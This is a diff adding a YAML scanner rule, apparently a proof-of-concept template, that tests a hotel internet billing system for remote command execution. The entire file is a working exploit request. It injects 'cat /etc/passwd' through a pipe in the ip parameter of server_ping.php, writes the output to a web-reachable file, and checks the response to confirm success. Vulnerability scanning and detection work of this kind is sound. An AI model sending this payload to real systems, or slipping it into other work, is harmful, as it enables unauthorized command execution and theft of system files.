@@ -1,0 +1,15 @@
+name: Hotel-Internet-Manage-RCE
+rules:
+  - method: GET
+    path: "/manager/radius/server_ping.php?ip=127.0.0.1|cat /etc/passwd >../../Test.txt&id=1"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
+      Accept-Encoding: "gzip,deflate"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"parent.doTestResult")
+detail:
+  author: test
+  Affected Version: "Hotel Internet Billing & Operation Support System"
+  links:
+    - http://118.190.97.19:88/qingy/Web%E5%AE%89%E5%85%A8
+    
